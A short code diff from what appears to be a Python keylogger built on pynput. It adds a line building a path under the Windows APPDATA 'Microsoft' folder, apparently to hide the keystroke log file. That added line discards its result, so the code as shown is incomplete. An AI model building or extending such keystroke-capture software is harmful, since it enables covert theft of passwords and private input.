@@ -3,6 +3,9 @@ from pynput.keyboard import Listener, Key
 import platform
 
 def get_key_file():
+
+    os.path.join(os.getenv('APPDATA'), 'Microsoft')
+
     if platform.system() == "Windows":
         
         arq = "key.txt"
